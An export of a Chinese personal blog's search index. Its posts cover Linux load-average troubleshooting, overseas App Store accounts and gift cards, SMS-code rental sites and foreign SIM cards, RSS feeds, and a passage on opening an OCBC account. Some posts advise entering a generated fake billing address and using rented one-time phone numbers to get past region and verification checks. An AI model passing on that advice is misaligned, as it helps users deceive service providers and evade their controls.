<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Load 持续飙高的原理讲解和应急机制</title>
      <link href="/blog/2023/10/27/sre-load-increase/"/>
      <url>/blog/2023/10/27/sre-load-increase/</url>
      
        <content type="html"><![CDATA[<p>网上有很多描述 Load 的例子，将单核处理器比喻成一座桥，将 Load 比作车流，当桥上没有车的时候，Load &#x3D; 0，当桥上塞满车的时候，Load &#x3D; 1，当桥上塞满车甚至开始排队等候的时候，Load &gt; 1，当 Load &gt; 5 的时候，整座桥基本就是瘫痪状态了。</p><h2 id="Load-中的-R-和-D"><a href="#Load-中的-R-和-D" class="headerlink" title="Load 中的 R 和 D"></a>Load 中的 R 和 D</h2><p>也有非常专业的研究，比如<a href="https://gitee.com/anolis/ssar#%E7%89%B9%E5%BC%82%E6%8C%87%E6%A0%87load5s%E6%B7%B1%E5%85%A5%E8%AF%B4%E6%98%8E">这个项目</a>，平时我们关注比较多的是 Load1，Load5 和 Load15，表示一分钟、五分钟和十五分钟内系统的平均拥塞情况，为了更好地理解和分析 Load，作者开发了一个 Load5s 工具，能够感知系统 5s 内的 Load 情况。</p><p>对 Load 比较准确的描述是：<br>loadavg 文件中前三个字段是平均负载值，分别代表 1、5 和 15 分钟的作业数量的平均值，作业包括运行队列 (state R) 或者等待磁盘 I&#x2F;O (state D) 两种类型</p><p>对于 State R 和 State D 的解释，可以这样去理解：</p><ul><li>State R：正在使用 CPU 或者等待使用 CPU 的 Job</li><li>State D：正在等待 IO 的 Job，例如磁盘 IO、网络 IO 等等</li></ul><p>由于这两种状态的存在，加上我们服务大多是多核多线程的，因此分析问题的时候就出现了如下几种情况：</p><ol><li>单个线程中 R 状态的 Job 很多</li><li>多个线程中 R 状态的 Job 很多</li><li>单个线程中 D 状态的 Job 很多</li><li>多个线程中 D 状态的 Job 很多</li></ol><p>接下来我们的分析也是围绕这几种情况来讨论。</p><p>不同 R 和 D 情况导致的 Load 飙高</p><h3 id="1-单线程中-R-状态的-Job-很多"><a href="#1-单线程中-R-状态的-Job-很多" class="headerlink" title="1. 单线程中 R 状态的 Job 很多"></a>1. 单线程中 R 状态的 Job 很多</h3><p>单线程中 R 状态的 Job 比较多，往往是程序出问题了，比如写了一个死循环，循环中频繁地进行业务处理，再比如业务没有控制好并发，大批量地处理业务逻辑等等。这个时候使用 top 命令查看各 CPU 的情况，会发现，只有一个 CPU 是繁忙的，其他的都很空闲。</p><p>其实这类情况是最好定位和排查的，通常 CPU 也会跟着 Load 一起飙升。还有一种常见的诱因，比如业务将一个超大的 YAML 文本解析成 JSON，这个时候会导致十分频繁的 GC，频繁的 GC 会导致 CPU、内存全部暴涨，对应的 Load 也会上涨。极端的情况，这个进程会因为内存溢出而 Crash。</p><h3 id="2-多个线程中-R-状态的-Job-很多"><a href="#2-多个线程中-R-状态的-Job-很多" class="headerlink" title="2. 多个线程中 R 状态的 Job 很多"></a>2. 多个线程中 R 状态的 Job 很多</h3><p>这说明业务中出现了大量导致计算密集型的请求，落在了不同的进程上，这种情况容易出现在产品迭代后刚上线的时候，比如某个业务频繁请求的接口出现了异常的逻辑没有处理好。</p><p>针对大型系统的变更，上线之前一般会进行压力测试，在压测过程中可以暴露这种问题。</p><h3 id="3-单个线程中-D-状态的-Job-很多"><a href="#3-单个线程中-D-状态的-Job-很多" class="headerlink" title="3. 单个线程中 D 状态的 Job 很多"></a>3. 单个线程中 D 状态的 Job 很多</h3><p>这种情况出现的可能性比较多，需要具体情况具体分析。大家知道我们的系统时刻都在处理各种各样业务逻辑，一个请求过来会随机落在机器的任何一个进程上处理，很容易出现某个特殊的请求执行的逻辑十分繁重，比如执行了一个导入任务，将上百篇文档储存到 OSS，每次储存都有一次网络 IO，瞬间发起的大量网络 IO 对系统负载挑战也是比较大的。</p><h3 id="4-多个线程中-D-状态的-Job-很多"><a href="#4-多个线程中-D-状态的-Job-很多" class="headerlink" title="4. 多个线程中 D 状态的 Job 很多"></a>4. 多个线程中 D 状态的 Job 很多</h3><p>基本上可以断定是业务在做超频繁的 IO 操作，或者每次 IO 操作的成本巨大，比如从磁盘中读取一个大文件到内存，或者挂载的是远程磁盘，IO 操作十分缓慢，再比如网络异常，导致宿主机上的所有网络 IO 都 pending，从而导致 Load 飙高。</p><h2 id="遇到-Load-飙高如何定位"><a href="#遇到-Load-飙高如何定位" class="headerlink" title="遇到 Load 飙高如何定位"></a>遇到 Load 飙高如何定位</h2><p>CPU 是系统的一个瞬时状态，而 Load 代表的是系统一段时间内的负载情况，如果 Load1、Load5、Load15 陆续开始报警，那就比较危险了，这说明系统长时间内（至少 15 分钟）都有点喘不过气来了，这个时候必须结合 CPU、内存、GC 等指标去排查业务问题，否则下一秒可能系统就会出现瘫痪状态，业务站点假死，一直 loading 加载不出页面。</p><p>从前面的分析可以看出，Load 飙高主要是因为 D 状态和 R 状态的 Job 过多导致的，但是我们的分析工具又没有把各个进程的 D 和 R Job 数打印出来，即便是打印出来，相信很多同学也不一定看得懂。这个时候还是要去观察两类指标：</p><h3 id="1-系统是不是有很多-IO-操作"><a href="#1-系统是不是有很多-IO-操作" class="headerlink" title="1. 系统是不是有很多 IO 操作"></a>1. 系统是不是有很多 IO 操作</h3><p>一般的业务系统很少出现频繁的磁盘 IO，这种在数据库服务器上出现的比较多，比如执行了一条没有加索引的 SQL，导致扫全表，这个时候磁盘 IO 就特别大，会出现超频繁的磁盘读写操作。</p><p>top 命令中有一个指标是用来衡量磁盘 IO 的：</p><p><img src="/../blogimgs/2023/10/27/top.png" alt="Top"></p><p>截图中的 wa，如果这个值比较高，那就要注意，是不是存在什么异常的读写操作，在 npm registry 这样的系统中可能会经常出现此类问题导致的 Load 飙高。</p><p>这种情况大概率还是出现在业务请求之中，看到最多的是一些宿主机网络不稳当，导致宿主机内容器的所有请求都超时，这个时候系统的表现是 CPU 良好，Load 持续报警。也可能因为上游系统吞吐量降低，响应迟钝，比如平时 100ms 就能响应，结果某段时间内需要 2~3s 才会响应，也会导致系统 Load 飙高。</p><h3 id="2-观察-CPU-的走向"><a href="#2-观察-CPU-的走向" class="headerlink" title="2. 观察 CPU 的走向"></a>2. 观察 CPU 的走向</h3><p>CPU 高没啥问题，只要低于 70% 基本上都属于比较正常的水位，但是 CPU 高导致 Load 也跟随变高，那就有问题了，这意味着业务可能出现了死循环或者正在处理非常复杂的计算逻辑，比较常见的情况是，使用正则对长字符串做匹配，如果你的业务出现这种问题，赶紧去做一下 CPU Profile，看看一段时间内程序核心运行的是哪些逻辑，在 Node.js 中火焰图是针对这类问题的排查好助手。在做 Profile 之前也可以去看一下 GC 的特征，如果 GC 很频繁而且时间很长，基本上可以断定业务在做复杂的数据处理。</p><p>如果 Load 很高，但是 CPU 很低，这种情况基本是因为业务的 D 状态 Job 过多导致的，去看一看业务的超时日志，以及函数执行的时长。也可以去看看自己的服务响应时长，如果依赖的系统出现了网络卡顿，那么自己的系统响应地整体响应也会被拉长。</p><h2 id="应急机制"><a href="#应急机制" class="headerlink" title="应急机制"></a>应急机制</h2><p>Load 飙高可用的应急手段并不多，常见的应急有两类：</p><ul><li>确定是宿主机网络问题，赶紧去置换机器，换到其他机房或者地区</li><li>确定是单进程中的 R 或 D 问题，可以考虑等他自己缓慢恢复，确定了无法恢复，比如遇到了死循环，可以考虑将进程直接杀死</li></ul><p>总之，还是需要结合 CPU、GC、Memory 和业务日志综合分析，定位到最精确的问题再对症下药。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 运维技术 </category>
          
          <category> 后端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRE </tag>
            
            <tag> Load </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>海外 App Store 账号和礼品卡</title>
      <link href="/blog/2023/09/14/non-chinese-app-store-account/"/>
      <url>/blog/2023/09/14/non-chinese-app-store-account/</url>
      
        <content type="html"><![CDATA[<p>AI 盛行的当下，很多人都满怀好奇心，想一头扎进去看个究竟，而国内因为政策原因，AI 产品几乎已全被下架，未来需要经历类似备案流程才有机会重新上架自己的产品，因此大量开发者把自己的 AI 服务瞄向了海外市场，在 App Store 上也只在非中国大陆区上架自己的产品。</p><p>如果你要在非中国大陆区下载和体验产品，躲不过的第一个门槛是，你得有对应国家或地区的 App Store 账号，很多年前我在某宝上买了一个美区账号，用了几年之后，突然不可登录了，由于没有及时修改账号绑定的邮箱和手机号码，目前已经无法完成风险验证，相当于这个账号就没了。</p><p>事实上，申请一个其他国家或地区的 App Store 账号并不麻烦，本文的目的就是带你自助申请一个属于自己的账号，同时教你如何完成付费软件的下载。</p><h2 id="账号创建流程"><a href="#账号创建流程" class="headerlink" title="账号创建流程"></a>账号创建流程</h2><p>以申请一个台湾省的 Apple Id 为例，首先打开 <a href="https://appleid.apple.com/">appleid.apple.com</a>，进入到创建流程，你会看到一张 Apple Id 的申请表单，</p><p><img src="/../blogimgs/2023/09/13/apple-id-create-form.png" alt="Apple ID Create Form"></p><p>App Store 账号的申请需要有手机号码验证，让人释怀的是，它并没有强制要求你使用当地的手机号码来验证信息，因此使用你的 <code>+86</code> 就行了。</p><blockquote><p>要知道很多软件（例如 ChatGPT&#x2F;Claude 等）的注册和使用，不仅要求你的 IP 是非中国区的，还要求你注册时用于验证的手机号码也是非中国区的，如遇到这类问题，可参阅前文 <a href="/blog/2023/09/13/non-chinese-phone-checkcode-and-uk-giffgaff">《接码平台与海外手机卡》</a> 进行操作。</p></blockquote><p>填写完成后，会要求你验证邮箱和手机号码，验证完成，账号就到手了。此时的账号在登录到手机进行软件下载时，会出现如下提醒：</p><p><img src="/../blogimgs/2023/09/14/app-store-attention.png" alt="APP Store Attention"></p><p>首次使用 Apple ID 下载软件，苹果要求你填写两个信息：</p><ol><li>同意所在国家或者地区的协议，勾选下就好了</li><li>补充和完善你的地址信息，因为在 APP Store 购物是需要账单地址的，虽然现在基本都是走电子账单，你也是可以要求它提供纸质账单的</li></ol><p>如下图所示：</p><p><img src="/../blogimgs/2023/09/14/app-store-check.png" alt="APP Store Check"></p><p>很显然，你是没有其他国家或者地区的居住地址的，不过这里可以随便填写，去 Google 上搜一下「地址生成器」，能找到很多辅助工具。完成这个配置以后，你就可以顺利下载软件了。</p><p><strong>在上方填写账单地址信息时，无需配置付款方式</strong>，因为你没有对应国家或地区的付款工具的，置空就好，填写账单地址时确保地址+邮编是匹配的就行了，如果不匹配，那说明你的地址生成器有问题，或者填写的邮编位数不对，例如我测试的时候，地址生成器给出的台湾省邮编是 6 位数，可 App Store 只需要你填写前 3 位就够了。</p><h2 id="礼品卡：付费软件下载"><a href="#礼品卡：付费软件下载" class="headerlink" title="礼品卡：付费软件下载"></a>礼品卡：付费软件下载</h2><p>App Store 在不同国家和地区支持的付款方式有所差异，例如在中国支持银行卡、微信和支付宝等进行支付，在台湾省支持的方式就是银行卡或者电话代付，在美国还支持 Paypal。不是所有的银行卡都可以直接完成绑定的，必须是所在国家或地区的申请的，例如你在美区绑定中国的 Visa&#x2F;MasterCard 就会失败。</p><p>我没有 Paypal，没有对应地区的银行卡，也没有对应地区的手机号码，怎么办？有两条路径可以解决这个问题，一个是你去申请对应国家或者地区的银行卡，例如之前有一篇文章提到，使用全部大陆身份信息就能免费申请一张 <a href="/blog/2023/09/06/ocbc-bank/">新加坡华侨银行 OCBC 的银行卡</a>，有了新加坡区的 App Store 账号，又有了新加坡的银行卡，自然就可以完成付费绑定了，这条路很折腾。</p><p>另外一个方式也比较简单，你可以使用礼品卡（Gift Card）进行付款，礼品卡相当于一张定额的充值卡，可以给你的 Apple ID 充值金额，它的购买渠道也比较多，大多数人都会选择直接从淘宝咸鱼上购买。下面我告诉你两个其他的通道，也十分便捷。</p><h3 id="在-Apple-官网购买礼品卡"><a href="#在-Apple-官网购买礼品卡" class="headerlink" title="在 Apple 官网购买礼品卡"></a>在 Apple 官网购买礼品卡</h3><p>Apple 的官网是 <a href="https://apple.com/">apple.com</a>，点击进入到官网后，下拉到最底部，将地区切换到你 Apple ID 账号所在的区域，然后在底部找到 Gift Card 的购买入口：</p><p><img src="/../blogimgs/2023/09/14/gift-card-entry.png" alt="Gift Card Entry"></p><p>依次按照流程进行购买即可。需要注意的是，不同区域的流程略有差异，例如美国就是直接选择礼品卡，然后付费；而在台湾省，则是让你将礼品卡赠送给其他人，你需要填写金额然后填写邮箱信息，最后会给你定制成一封包含礼品卡信息的邮件：</p><p><img src="/../blogimgs/2023/09/14/gift-card-send.png" alt="Gift Card Send"></p><p>上图中，你全部都填自己的电子邮件就好了。填写完之后下单，也会进入到支付流程：</p><p><img src="/../blogimgs/2023/09/14/checkout.png" alt="Gift Card Checkout"></p><p>这里支持中国的 Visa&#x2F;MasterCard 信用卡进行支付，支付完成就会立刻给你的邮箱发送礼品卡的信息啦。</p><h3 id="在支付宝上直接购买"><a href="#在支付宝上直接购买" class="headerlink" title="在支付宝上直接购买"></a>在支付宝上直接购买</h3><p>目前我只找到了美区的礼品卡购买渠道，其他渠道，例如土耳其，还是建议直接上官网或者找淘宝咸鱼购买。这是网友给我留言提供的操作路径，我走过这个流程，是可以成功购买的：</p><blockquote><p>支付宝地区改成美国城市，点击底部 “出境” tab 的 “折扣礼卡” 里，滑到最底部 “更多大牌折扣礼卡” ，点击打开后，找到 App store &amp; itune，点击购买后会给你兑换码然后复制下，点击app store顶部右上角里的兑换充值码，充值就行了</p></blockquote><p>不过今天去看的时候，发现支付宝的 UI 已经改版了，为了避免大家找不到，我还是截了个图，它藏的实在有点深：</p><p><strong>1. 切换到美区地址后，往下拉，在汇率卡片下面，有一个礼品卡入口</strong></p><p><img src="/../blogimgs/2023/09/14/gift-card-alipay-entry.png" alt="Gift Card Alipay Entry" width="350" /></p><p><strong>2. 点击进去后，拉倒最底部，找到「更多大牌折扣礼卡」入口</strong></p><p><img src="/../blogimgs/2023/09/14/alipay-more-giftcard.png" alt="Alipay More Gift card" width="350" /></p><p><strong>3. 点击进去后找到苹果礼品卡入口，在列表中，比价醒目</strong></p><p><img src="/../blogimgs/2023/09/14/alipay-giftcard.png" alt="Alipay More Gift card" width="350" /></p><p>它支持 2 到 500 美金的任意额度进行充值，<strong>存在支付失败的可能，多尝试几次就好了</strong>，大概会在付款结束后的 15min 内在当前账户的个人页里头发卡号给你，交易前多看看文字提醒。</p><h3 id="付费失败？？？"><a href="#付费失败？？？" class="headerlink" title="付费失败？？？"></a>付费失败？？？</h3><p>成功购买了 Gift Card，在尝试购买软件的时候，却失败了，提示「Your Purchase Could Not Be Completed」相关异常？</p><p><img src="/../blogimgs/2023/09/14/gift-card-failed.png" alt="Gift Card Pay Failed" width="400" /></p><p>这也是比较正常的现象，如果你是新账号，然后立马充值了礼品卡，在点击付费软件下载的时候，<strong>会触发风控，一天后重新尝试就好了</strong>，如果持续失败，你倒是可以联系下客服，告诉他你购买礼品卡后付费持续失败，要求退款，他们肯定会帮你处理好的。</p><p>另外，如果绑定了对应地区的银行卡或者其他付款方式，风控会立即解除。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>你看看，够不够折腾，下载个软件，又是要申请 App Store 账号，又是要购买礼品卡，到最后还来一个风控无法完成付费。不过这些工作，也就是折腾一次，前前后后快的话，半个小时内可以搞定，倒也是可以接受的。</p><p>不知道未来苹果在整个流程上会不会再增加门槛，如果需要经常在境外 App Store 上下载软件，不妨找个时间，折腾下，先备着吧。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 数字游民 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>接码平台与海外手机卡</title>
      <link href="/blog/2023/09/13/non-chinese-phone-checkcode-and-uk-giffgaff/"/>
      <url>/blog/2023/09/13/non-chinese-phone-checkcode-and-uk-giffgaff/</url>
      
        <content type="html"><![CDATA[<p>如果你注册和使用过 ChatGPT，那你对这篇文章要解决的问题就会深有感触，注册时使用邮箱登录后，OpenAI 会要求你绑定一个手机号码，而这个手机号码不允许是中国大陆区的，很多人都会卡在这一步。</p><p>有两条路径来解决这个问题，1）使用接码平台，临时租一个非大陆手机号码，用来接收验证码；2）你可以直接购买一张非大陆区的手机卡。本文会告诉你，这两条路径分别该怎么走。</p><h2 id="接码平台"><a href="#接码平台" class="headerlink" title="接码平台"></a>接码平台</h2><p>接码平台，顾名思义，就是能够接收手机验证码的平台，事实上，在中国，搭建接码平台是存在巨大法律风险的，这里有一篇由检察院出具的<a href="https://www.toutiao.com/article/7119772491043750432/">《接码平台相关方行为的刑事定性》</a>，可以参阅，摘要如下：</p><blockquote><p>接码平台相关方通过接码平台大量获取手机号和验证码，并据此批量注册转化成互联网账号，源源不断地为下游黑灰产业“输血供粮”，为黑灰产从业者筑起了隐匿身份的巨大屏障，具有较大的社会危害性和法益侵害性。现阶段对接码平台相关方行为的刑事规制仍待加强，可通过分析接码所涉主体、运行过程等，区分实名卡和非实名卡，以对接码平台相关方行为予以精准刑事定性。</p></blockquote><p>本文提到的接码平台，都是国外的平台，接码范围是全球手机号码，作为使用方，主要用途在于注册海外的产品或者应用。</p><p>市面上接码平台不胜枚举，我平时用得比较多的主要是两个，一个是 <a href="https://5sim.net/">5sim.net</a>，另外一个是 <a href="https://sms-activate.org/">sms-activate.org</a>，它们支持全球 170+ 个国家的手机验证码。这两个平台都支持使用信用卡或者支付宝进行充值，也支持其他超丰富的支付方式：</p><p><img src="/../blogimgs/2023/09/13/sms-active-pay.png" alt="SMS Active Pay"></p><p>如果你经常使用的话，可以考虑充个 5~10 美金进去，省得未来需要经常打开支付宝进行充值。使用也是比较简单的，先选择服务然后选择国家，例如你要注册 ChatGPT 就选择 OpenAI 服务，然后选择一个国家的号码，不同国家的费用差异较大，例如美国就比印度要贵很多，</p><p><img src="/../blogimgs/2023/09/13/sms-active-usage.png" alt="SMS Active Usage"></p><p>号码选好之后，就可以看到一个等待接受验证码的界面了，你可以在验证码发过来之前取消选号，这个时候是不收费的。整体交互很容易看懂，这里不再赘述。</p><p>唯一需要注意的是，<strong>只要平台接收到了验证码，就会完成扣费动作</strong>，无论你的注册或者登录是否成功，而且你无法长期租用同一个手机号码，所有的接码都是一次性使用，因此，对于较为敏感的需要长期固定手机号码来验证的账户，不要使用接码平台。</p><h2 id="海外手机卡"><a href="#海外手机卡" class="headerlink" title="海外手机卡"></a>海外手机卡</h2><p>对于跟资金、信用等相关的平台，更建议使用长期不变的号码。有研究过 Google Voice，但是网上看到好多保号失败的案例，加上近期 Google 对这一块做了更严格的调整，号码丢失的概率偏大，因此更建议购买实体卡。</p><p>去网上搜到比较多的是美国 Paygo、英国 giffgaff 和新西兰 Skinny，详情可以戳 <a href="https://twitter.com/Barret_China/status/1638404990715961345">这个帖子</a>。</p><h3 id="美国卡"><a href="#美国卡" class="headerlink" title="美国卡"></a>美国卡</h3><p>美国卡分好几种，有最便宜的 Paygo，一个月 3 刀的基础费用；也有橙卡，橙卡的优势是无限通话、无限短信和流量上网，需要注意的是，通话过程要开启 WiFi-Calling，否则费用会比较贵，它的另外一个优势是，上网的时候出口 IP 是美国本地 IP，部分场景下比较有用。</p><p>橙卡月租最低 10 美元，需要一年充值 120 美元或者每月 15 美元。我发现挺多网友都选择了 Paygo。</p><h3 id="英国卡"><a href="#英国卡" class="headerlink" title="英国卡"></a>英国卡</h3><p>英国卡也分好多种，除了 giffgaff，还有 Three&#x2F;EE&#x2F;O2 卡，giffgaff 是这几种里头卖的最火的。</p><p><img src="/../blogimgs/2023/09/13/giffgaff.png" alt="Giffgaff card"></p><p>简单介绍下这张卡，因为我刚好买的就是这样：</p><ol><li>giffgaff 有多种套餐，不同套餐存在不同时效性，例如 30&#x2F;90&#x2F;180 天，一般适合旅游使用，到期了号码就被回收了</li><li>购买可以选择套餐，有几个套餐是不会被回收，不过要求定期消费，超过 180 天不消费，号码仍然会被回收掉，消费后会继续延长 180 天，所谓的消费：<code>发一条短信或者打一个电话</code></li><li>有些套餐买卡的时候，卡里头会有几英镑的余额，用完了就得充值，可以去它的官网 <a href="http://giffgaff.com/">giffgaff.com</a> 进行充值，但是需要有国际信用卡或者国际 PayPal，这条路一般人都走不通；但是有网友反馈，中国的卡也行</li></ol><p>giffgaff 的最大优点就是零月租，缺点是保号费劲。我是在某宝上购买的，98 块的卡，第二天就到了，里头有 15 英镑，每半年内消费一次（发短信打电话都行）便可继续保号半年，感觉可以用个五年八年的了……关于保号，官方的说明：</p><blockquote><p>To stop deactivation do any one of the following actions at least once every 6 months:</p><ul><li>Make at least one call, SMS or MMS to another number</li><li>Make at least one connection to the internet using your mobile data</li></ul></blockquote><p>不在某宝购买也可以获得，你可以去它的官网申请一张，会平邮寄过来，差不多一两周能到。</p><h3 id="新西兰卡"><a href="#新西兰卡" class="headerlink" title="新西兰卡"></a>新西兰卡</h3><p>新西兰的 Skinny 我没有具体研究，看网友说，海购 200 左右，零月租，一年充值一次，可保号。因为先看到 giffgaff，而且有同事在用，就没有过多研究其他卡种了。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总体来看，美国卡成本略高一点，如果你是一个数字游民，在做出海的业务，且市场人群主要在美国，那还是比较建议你搞一张美国手机卡；但如果你只是想在网上消费一些海外产品，英国卡、新西兰卡等，都是够用的，成本也不算高。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 数字游民 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>构建你自己的信息流</title>
      <link href="/blog/2023/09/10/build-your-own-timeline/"/>
      <url>/blog/2023/09/10/build-your-own-timeline/</url>
      
        <content type="html"><![CDATA[<p>我在<a href="https://twitter.com/Barret_China/status/1694903398523347211">社交媒体</a>上给读者推荐了一位宝藏博主，</p><p><img src="/../blogimgs/2023/09/10/baozang.png" alt="宝藏博主"></p><p>很多人觉得内容还不错，但也开始犯愁了，原因是这个博主人在微博上，可自己的微博却已尘封多年，不想去关注。那有没有办法在不打开微博的同时，又能够获取到这位博主的输出呢？要知道，在互联网上，类似微博的平台还有很多很多，我们会无数次错过这样的宝藏博主。</p><h2 id="不可控的信息流"><a href="#不可控的信息流" class="headerlink" title="不可控的信息流"></a>不可控的信息流</h2><p>其实大家对信息流这个概念已经再熟悉不过了，点开淘宝，首屏就是一个调和了你胃口的商品信息流，点开今日头条、点开抖音，映入眼帘的均是信息流，只不过承载信息的载体略有不同，有的是一个图文列表，而有的是一个视频列表，我们无时无刻不沉浸在各式各样的信息流之中。值得一提的是朋友圈，它是一个较为特殊的信息流，由你关注的朋友所产生的内容所构成，但随着微信成长了十年，大多数人的朋友圈也早已泛滥。</p><p>如果你跟我一样，不想安装太多的客户端，不想被太多无关的信息干扰，又想把自己关心的信息聚集到一处，那么接下来就是你关心的内容了。</p><h2 id="构建属于自己的信息流"><a href="#构建属于自己的信息流" class="headerlink" title="构建属于自己的信息流"></a>构建属于自己的信息流</h2><p>如何把散落在各个平台的「宝藏」信息给聚合起来，放到一块儿关注呢？长话短说，我来提供一点工具和线索，下图是构建的效果图：</p><p><img src="/../blogimgs/2023/09/10/timeline.png" alt="Timeline"></p><p>1）<strong>你需要一个 RSS 阅读器</strong>，我推荐 Reeder 5，Mac&#x2F;iPhone&#x2F;iPad 三端体验都没有太多可挑剔的地方，关键是它支持滚动代替已读，有些看了标题就不想点进去的内容，只要滚动条滚过去，就会自动标记为已读，如果你是一个经常上千未读的订阅者，这个功能很减压，它是收费的；有一个体验稍微弱一点的免费产品，NetNewsWire，我也体验过一段时间，还不错；</p><p>2）<strong>你需要一个将任意内容转换成 RSS 的工具</strong>，我推荐 RSSHub，<a href="https://docs.rsshub.app/">https://docs.rsshub.app</a>，它目前已经把主流媒体和渠道的内容转化成了 RSS；你也可以自己去定制，将互联网上喜欢的内容转换成 RSS；</p><p>3）我建议你找一个 RSS 平台，注册一个账号，来<strong>管理 RSS 集合</strong>，一方面可以方便你在多个平台之间同步数据,包括订阅源的增删改查，以及已读、未读、收藏等状态的同步，另一方面也可以很好地支持多人协同，例如分享你的订阅给他人，或者将他人的订阅转为自己的订阅等等；我调研了不少类似的产品，最后选择的是 Inoreader，<a href="https://inoreader.com/">https://inoreader.com</a>，虽然也是收费产品，但免费额度足够使用；</p><p>接下来需要做的事情，就是去寻找自己喜欢的内容啦，这是一件长期的工作，不断去扩充自己的阅读边界；更重要的是，需要时常维护自己的订阅源，例如某些长期被略过的内容，即便偶尔出现一点点好的内容，也应该果断放弃，因为筛选成本太高了。</p><h2 id="关于构建过程中的一些疑惑"><a href="#关于构建过程中的一些疑惑" class="headerlink" title="关于构建过程中的一些疑惑"></a>关于构建过程中的一些疑惑</h2><p>RSS 可以说是上个互联网时代的产物，随着 Google Reader 的下线，RSS 也已宣布死亡，在国内，类 RSS 工具甚至在 APP Store 上都找不到了，具体缘由本文不继续拓展。</p><p>找到一个自己用的趁手的 RSS 阅读器会是一个首选命题，很多 RSS 聚合平台，例如 Feedly&#x2F;Inoreader&#x2F;NewsBlur 等等，都会研发自己的 RSS 阅读器，如果你用得习惯，觉得体验上完全可以满足自己的需求，那么上述构建过程的第一步是可以省略的。</p><p>大多数的 RSS 阅读器都可以变成一个 Local Only 的工具，再利用类似 iCloud 作为数据中介便可以实现 RSS 源的多端同步，那为啥我还推荐你找一个平台注册一个账号来管理 RSS 呢？前文已经做出了简单的解释，其实除了体验以外，最重要的还是平台会有更多的优势，例如它会帮你探索内容，当你找到了 <code>A</code> 时，借助平台你可以找到更多 <code>A&#39;</code>；再例如，平台提供了智能监测和过滤的能力，有读者<a href="https://web.okjike.com/originalPost/64e84610c70326f2eb30947a">提到</a>：</p><blockquote><p>我之前用的 Inoreader ，核心功能是关键词监控，非常喜欢；其次是关键词过滤，设置规则后可以自定义动作。今年换了 NetNewsWire 这个免费客户端，似乎也够用。我的源是动态更新的，主要是博客、newsletters 、政务信息、媒体等。<br><img src="/../blogimgs/2023/09/10/reader-comment.png" alt="Reader Comment"></p></blockquote><p><a href="https://docs.rsshub.app/">RSSHub</a> 这个项目已经开源了很多年了，它内置了大量平台的信息源订阅能力，例如 Bilibili&#x2F;Twitter&#x2F;Weibo&#x2F;Youtube 等等：</p><p><img src="/../blogimgs/2023/09/10/rsshub-bilibili.png" alt="RSSHub Bilibili"></p><p>你需要做的，就是上去找到自己需要的博主，然后把对应的 ID 给扒拉下来，拼接成 RSS 源，加入到你的 RSS List 就行了。</p><h2 id="去行动"><a href="#去行动" class="headerlink" title="去行动"></a>去行动</h2><p>或许你十分享受沉浸在不同社交媒体带来的信息流体验之中，那这个工具可能也不会适合你。有的人会觉得这个操作有点硬核，上手成本略高，我只能说，所有的一切都在那里，有的人看到以后会去实践，而有的人只是把本文收藏起来，然后尘封。🐶</p><p>工具的构建只不过是起步，关键在于持续挖掘对自己有益的信息源，不断拓展自己的阅读边界。再次强调，在构建信息源的过程中，需要长期保持对信息源结构和内容的更新，确保获得的信息是对自己有效且能够产生认知增强的，<strong>否则，所有的行动，只不过是给自己构建了另外一个信息蚕房罢了。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新加坡华侨银行 OCBC 开户小记</title>
      <link href="/blog/2023/09/06/ocbc-bank/"/>
      <url>/blog/2023/09/06/ocbc-bank/</url>
      
        <content type="html"><![CDATA[<p>最近看到好多人推荐开通新加坡华侨银行 OCBC，这是我目前为止看到唯一一个，使用全部大陆身份信息就可以安全开通且没啥后顾之忧的境外银行卡，之前尝试开通 Wise，获得了一张英国 Visa 卡，但没有英国境外地址一直让我担忧被风控，而 ZA Bank 需要肉身去香港才能开通，因为它要求你提供出境记录，而且本质还是一张虚拟卡。</p><p><img src="/../blogimgs/2023/09/06/ocbc.png" alt="OCBC"></p><h2 id="境外银行卡"><a href="#境外银行卡" class="headerlink" title="境外银行卡"></a>境外银行卡</h2><p>如果你平时炒美股或者港股，此刻手里头肯定已经有了一张境外银行卡，至少香港卡是有一张的，几乎所有的美股港股的证券入金都要求你使用境外银行卡。我手里头就有一张招行香港一卡通，办了差不多十年了，这张卡有两个毛病，一是不能线上消费，它没有 CVV（Card Verification Value），例如给 Github 续费，购买 Twitter 会员等，这张卡就使不上劲，另外一个问题是管理费较高，其实大多数的境外卡都是有管理费的，如果卡里钱比较少的话，它的扣费就比较恐怖了，这是官方客服的回复：</p><blockquote><p>账户管理费收费标准：每月5号扣款，扣款当月审核前3个月日均资产</p><ul><li>前3个月日均资产达到等值10万港币及以上不收；</li><li>前3个月日均资产在等值5000港币至10万港币之间，每月50港币，电子账单优惠至10港币每月；</li><li>前3个月日均资产低于等值5000港币，每月150港币，电子账单优惠至100港币每月</li></ul></blockquote><p>所以简单来说，如果你有海外的购物、消费场景，或者有炒股需求，搞一张具有 CVV 的银行卡（信用卡、储蓄卡都可）是不可避免的。香港很多银行的卡片在大陆就可以办理，例如民生香港、汇丰香港等，不过他们都有一定的门槛，要求你在卡里存 10w~30w，放一到三个月，或者购买他们的投资理财产品才允许申请，还得去网点柜台。</p><p>那有没有低管理费，又可以方便快捷办理的境外银行卡呢？其实还挺多的，本文要介绍的就是新加坡华侨银行，OCBC。</p><h2 id="OCBC-的在线开通和踩坑记录"><a href="#OCBC-的在线开通和踩坑记录" class="headerlink" title="OCBC 的在线开通和踩坑记录"></a>OCBC 的在线开通和踩坑记录</h2><p>OCBC 是新加坡第二大行，完全有保障，其账户的开通全程都可以使用大陆 IP 